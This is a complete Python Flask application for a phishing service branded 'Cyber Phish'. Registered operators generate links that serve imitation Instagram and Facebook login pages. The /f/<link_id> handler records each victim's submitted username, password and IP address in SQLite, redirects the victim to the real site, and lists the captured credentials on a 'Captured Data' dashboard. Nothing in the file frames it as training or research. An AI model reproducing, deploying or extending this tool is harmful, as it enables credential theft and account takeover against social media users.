import os
import uuid
import sqlite3
from datetime import datetime, timedelta
from flask import Flask, request, render_template_string, redirect, url_for, jsonify

app = Flask(__name__)

DB_NAME = 'phish_data.db'

# ----------  ----------
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        link_id TEXT UNIQUE,
        template TEXT,
        created_at TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        link_id TEXT,
        username TEXT,
        password TEXT,
        ip TEXT,
        submitted_at TIMESTAMP,
        FOREIGN KEY (link_id) REFERENCES links (link_id)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS tokens (
        token TEXT PRIMARY KEY,
        user_id INTEGER,
        expires_at TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users (id)
    )''')
    conn.commit()
    conn.close()

init_db()

# ----------  ----------
def generate_token(user_id):
    token = str(uuid.uuid4())
    expires = datetime.now() + timedelta(days=30)
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("DELETE FROM tokens WHERE user_id=?", (user_id,))  #    
    c.execute("INSERT INTO tokens (token, user_id, expires_at) VALUES (?, ?, ?)", (token, user_id, expires))
    conn.commit()
    conn.close()
    return token

def validate_token(token):
    if not token:
        return None
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT user_id FROM tokens WHERE token=? AND expires_at > ?", (token, datetime.now()))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

# ---------- CSS (  ) ----------
BASE_STYLE = '''
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
        font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
        min-height: 100vh;
        color: #e0e0e0;
    }
    .container { max-width: 1400px; margin: 0 auto; padding: 30px 20px; }
    .glass-card {
        background: rgba(20, 28, 40, 0.7);
        backdrop-filter: blur(12px);
        border-radius: 32px;
        border: 1px solid rgba(0, 255, 255, 0.2);
        box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
        padding: 40px;
    }
    h1, h2, h3 {
        background: linear-gradient(135deg, #00ffff, #ff00ff);
        -webkit-background-clip: text;
        background-clip: text;
        color: transparent;
        margin-bottom: 20px;
    }
    .brand {
        font-size: 2.5rem;
        font-weight: 800;
        text-align: center;
        margin-bottom: 30px;
        text-shadow: 0 0 10px cyan;
    }
    input, select, button {
        width: 100%;
        padding: 14px 18px;
        margin: 12px 0;
        border-radius: 50px;
        border: none;
        background: rgba(10, 15, 30, 0.8);
        color: white;
        font-size: 1.1rem;
    }
    button {
        background: linear-gradient(95deg, #00aaff, #0066cc);
        cursor: pointer;
        font-weight: bold;
    }
    button:hover { transform: scale(0.98); }
    a { color: #00ffff; text-decoration: none; }
    .link-card {
        background: rgba(0, 0, 0, 0.4);
        border-radius: 28px;
        padding: 20px;
        margin-bottom: 20px;
        border-left: 5px solid cyan;
    }
    .badge {
        background: #ff00ff;
        padding: 6px 14px;
        border-radius: 40px;
        font-size: 0.8rem;
        display: inline-block;
        margin-right: 15px;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        background: rgba(0,0,0,0.3);
        border-radius: 20px;
    }
    th, td { padding: 15px; text-align: left; border-bottom: 1px solid #2a3246; }
    th { background: #1e2a3a; }
    .btn-small {
        display: inline-block;
        background: #2c3e50;
        padding: 8px 20px;
        border-radius: 40px;
        font-size: 1rem;
    }
    .flex-between { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
    .logout { text-align: right; margin-bottom: 20px; }
    @media (max-width: 768px) {
        .glass-card { padding: 20px; }
        .brand { font-size: 1.8rem; }
    }
</style>
'''

# ---------- HTML  (Jinja2) ----------
REGISTER_HTML = f'''
<!DOCTYPE html>
<html><head><title>Cyber Phish - Register</title>{BASE_STYLE}</head>
<body><div class="container"><div class="glass-card" style="max-width:500px;margin:auto;">
<div class="brand"> CYBER PHISH</div><h2>Register</h2>
<form id="regForm"><input type="text" id="regUsername" placeholder="Username" required>
<input type="password" id="regPassword" placeholder="Password" required>
<button type="submit">Register</button></form>
<div style="text-align:center;margin-top:20px;"><a href="/login">Already have an account? Login</a></div>
</div></div>
<script>
document.getElementById('regForm').onsubmit = async (e) => {
    e.preventDefault();
    const username = document.getElementById('regUsername').value;
    const password = document.getElementById('regPassword').value;
    const res = await fetch('/api/register', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({username, password})
    });
    const data = await res.json();
    if (data.ok) window.location.href = '/login';
    else alert(data.error);
};
</script>
</body></html>
'''

LOGIN_HTML = f'''
<!DOCTYPE html>
<html><head><title>Cyber Phish - Login</title>{BASE_STYLE}</head>
<body><div class="container"><div class="glass-card" style="max-width:500px;margin:auto;">
<div class="brand"> CYBER PHISH</div><h2>Login</h2>
<form id="loginForm"><input type="text" id="loginUsername" placeholder="Username" required>
<input type="password" id="loginPassword" placeholder="Password" required>
<button type="submit">Login</button></form>
<div style="text-align:center;margin-top:20px;"><a href="/register">Create new account</a></div>
</div></div>
<script>
document.getElementById('loginForm').onsubmit = async (e) => {
    e.preventDefault();
    const username = document.getElementById('loginUsername').value;
    const password = document.getElementById('loginPassword').value;
    const res = await fetch('/api/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({username, password})
    });
    const data = await res.json();
    if (data.token) {
        localStorage.setItem('auth_token', data.token);
        window.location.href = '/dashboard';
    } else alert(data.error);
};
</script>
</body></html>
'''

DASHBOARD_HTML = f'''
<!DOCTYPE html>
<html><head><title>Cyber Phish - Dashboard</title>{BASE_STYLE}</head>
<body><div class="container">
<div class="logout"><button id="logoutBtn" style="background:#4a2c2c; width:auto; padding:8px 20px;"> Logout</button></div>
<div class="glass-card">
<div class="brand"> CYBER PHISH</div>
<div class="flex-between"><h2>Dashboard, <span id="username"></span></h2><a href="/create_link" class="btn-small"> New Link</a></div>
<h3>Your Phishing Links</h3>
<div id="linksList">Loading...</div>
</div></div>
<script>
const token = localStorage.getItem('auth_token');
if (!token) window.location.href = '/login';

async function fetchJson(url, options) {
    const res = await fetch(url, {
        ...options,
        headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' }
    });
    if (res.status === 401) { localStorage.removeItem('auth_token'); window.location.href = '/login'; }
    return res.json();
}

async function loadDashboard() {
    const data = await fetchJson('/api/dashboard');
    document.getElementById('username').innerText = data.username;
    const linksList = document.getElementById('linksList');
    if (data.links.length === 0) linksList.innerHTML = '<p>No links yet. Click "New Link" to start.</p>';
    else {
        linksList.innerHTML = data.links.map(link => `
            <div class="link-card">
                <span class="badge">${link.template.toUpperCase()}</span>
                <code style="word-break:break-all;">${window.location.origin}/f/${link.link_id}</code>
                <div class="flex-between"><small>Created: ${link.created_at}</small>
                <a href="/victims/${link.link_id}"> View Victims</a></div>
            </div>
        `).join('');
    }
}

document.getElementById('logoutBtn').onclick = async () => {
    await fetch('/api/logout', { method: 'POST', headers: { 'Authorization': `Bearer ${token}` } });
    localStorage.removeItem('auth_token');
    window.location.href = '/login';
};
loadDashboard();
</script>
</body></html>
'''

CREATE_LINK_HTML = f'''
<!DOCTYPE html>
<html><head><title>Cyber Phish - Create Link</title>{BASE_STYLE}</head>
<body><div class="container"><div class="glass-card" style="max-width:600px;margin:auto;">
<div class="brand"> CYBER PHISH</div><h2>Generate New Link</h2>
<form id="createForm"><select name="template" id="template">
<option value="instagram">Instagram</option><option value="facebook">Facebook</option></select>
<button type="submit">Generate</button></form>
<div style="text-align:center;margin-top:20px;"><a href="/dashboard"> Back</a></div>
</div></div>
<script>
const token = localStorage.getItem('auth_token');
if (!token) window.location.href = '/login';
document.getElementById('createForm').onsubmit = async (e) => {
    e.preventDefault();
    const template = document.getElementById('template').value;
    const res = await fetch('/api/create_link', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({template})
    });
    if (res.status === 401) { localStorage.removeItem('auth_token'); window.location.href = '/login'; }
    else window.location.href = '/dashboard';
};
</script>
</body></html>
'''

INSTAGRAM_PAGE = f'''
<!DOCTYPE html>
<html><head><title>Cyber Phish - Instagram</title>{BASE_STYLE}</head>
<body><div class="container"><div class="glass-card" style="max-width:500px;margin:auto;">
<div class="brand"> CYBER PHISH</div><h2 style="text-align:center;">Instagram Login</h2>
<form method="post"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
</div></div></body></html>
'''

FACEBOOK_PAGE = f'''
<!DOCTYPE html>
<html><head><title>Cyber Phish - Facebook</title>{BASE_STYLE}</head>
<body><div class="container"><div class="glass-card" style="max-width:500px;margin:auto;">
<div class="brand"> CYBER PHISH</div><h2 style="text-align:center;">Facebook Login</h2>
<form method="post"><input type="text" name="username" placeholder="Email or Phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
</div></div></body></html>
'''

VICTIMS_HTML = f'''
<!DOCTYPE html>
<html><head><title>Cyber Phish - Victims</title>{BASE_STYLE}</head>
<body><div class="container"><div class="glass-card">
<div class="brand"> CYBER PHISH</div>
<div class="flex-between"><h2>Captured Data</h2><a href="/dashboard" class="btn-small"> Back</a></div>
<p><strong>Link ID:</strong> <code id="linkId"></code></p>
<div style="overflow-x:auto;"><table id="victimsTable" style="min-width:600px;"><thead><tr><th>Username/Email</th><th>Password</th><th>IP</th><th>Time</th></tr></thead><tbody></tbody></table></div>
</div></div>
<script>
const token = localStorage.getItem('auth_token');
if (!token) window.location.href = '/login';
const linkId = window.location.pathname.split('/').pop();
document.getElementById('linkId').innerText = linkId;
fetch(`/api/victims/${{linkId}}`, { headers: { 'Authorization': `Bearer ${{token}}` } })
    .then(res => { if(res.status===401) { localStorage.removeItem('auth_token'); window.location.href='/login'; } return res.json(); })
    .then(data => {
        const tbody = document.querySelector('#victimsTable tbody');
        if(data.victims.length===0) tbody.innerHTML = '<tr><td colspan="4">No victims yet. Share your link first.</td></tr>';
        else {
            tbody.innerHTML = data.victims.map(v => `
                <tr><td>${{v.username}}</td><td>${{v.password}}</td><td>${{v.ip}}</td><td>${{v.submitted_at}}</td></tr>
            `).join('');
        }
    });
</script>
</body></html>
'''

# ---------- API  ----------
@app.route('/')
def home():
    return redirect(url_for('login_page'))

@app.route('/register')
def register_page():
    return render_template_string(REGISTER_HTML)

@app.route('/login')
def login_page():
    return render_template_string(LOGIN_HTML)

@app.route('/dashboard')
def dashboard_page():
    return render_template_string(DASHBOARD_HTML)

@app.route('/create_link')
def create_link_page():
    return render_template_string(CREATE_LINK_HTML)

@app.route('/victims/<link_id>')
def victims_page(link_id):
    return render_template_string(VICTIMS_HTML)

@app.route('/f/<link_id>', methods=['GET', 'POST'])
def phish_page(link_id):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT template FROM links WHERE link_id=?", (link_id,))
    result = c.fetchone()
    if not result:
        conn.close()
        return "Invalid link", 404
    template_name = result[0]
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        ip = request.remote_addr
        c.execute("INSERT INTO victims (link_id, username, password, ip, submitted_at) VALUES (?,?,?,?,?)",
                  (link_id, username, password, ip, datetime.now()))
        conn.commit()
        conn.close()
        real_url = 'https://www.instagram.com' if template_name == 'instagram' else 'https://www.facebook.com'
        return f"<div style='background:#0a0f1e; color:cyan; text-align:center; padding:50px;'>Redirecting...<script>setTimeout(()=>{{window.location.href='{real_url}'}},2000);</script></div>"
    conn.close()
    return render_template_string(INSTAGRAM_PAGE if template_name == 'instagram' else FACEBOOK_PAGE)

# ---------- API  ----------
@app.route('/api/register', methods=['POST'])
def api_register():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({'ok': False, 'error': 'Username and password required'}), 400
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    try:
        c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
        conn.commit()
        conn.close()
        return jsonify({'ok': True})
    except sqlite3.IntegrityError:
        conn.close()
        return jsonify({'ok': False, 'error': 'Username already exists'}), 400

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT id FROM users WHERE username=? AND password=?", (username, password))
    user = c.fetchone()
    if not user:
        conn.close()
        return jsonify({'ok': False, 'error': 'Invalid credentials'}), 401
    token = generate_token(user[0])
    conn.close()
    return jsonify({'token': token})

@app.route('/api/logout', methods=['POST'])
def api_logout():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    if token:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("DELETE FROM tokens WHERE token=?", (token,))
        conn.commit()
        conn.close()
    return jsonify({'ok': True})

@app.route('/api/dashboard')
def api_dashboard():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    user_id = validate_token(token)
    if not user_id:
        return jsonify({'error': 'Unauthorized'}), 401
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT username FROM users WHERE id=?", (user_id,))
    username = c.fetchone()[0]
    c.execute("SELECT link_id, template, created_at FROM links WHERE user_id=?", (user_id,))
    links = [{'link_id': row[0], 'template': row[1], 'created_at': row[2]} for row in c.fetchall()]
    conn.close()
    return jsonify({'username': username, 'links': links})

@app.route('/api/create_link', methods=['POST'])
def api_create_link():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    user_id = validate_token(token)
    if not user_id:
        return jsonify({'error': 'Unauthorized'}), 401
    data = request.json
    template = data.get('template')
    if template not in ('instagram', 'facebook'):
        return jsonify({'error': 'Invalid template'}), 400
    link_id = str(uuid.uuid4())[:8]
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT INTO links (user_id, link_id, template, created_at) VALUES (?, ?, ?, ?)",
              (user_id, link_id, template, datetime.now()))
    conn.commit()
    conn.close()
    return jsonify({'ok': True})

@app.route('/api/victims/<link_id>')
def api_victims(link_id):
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    user_id = validate_token(token)
    if not user_id:
        return jsonify({'error': 'Unauthorized'}), 401
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,))
    owner = c.fetchone()
    if not owner or owner[0] != user_id:
        conn.close()
        return jsonify({'error': 'Unauthorized'}), 403
    c.execute("SELECT username, password, ip, submitted_at FROM victims WHERE link_id=? ORDER BY submitted_at DESC", (link_id,))
    victims = [{'username': row[0], 'password': row[1], 'ip': row[2], 'submitted_at': row[3]} for row in c.fetchall()]
    conn.close()
    return jsonify({'victims': victims})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)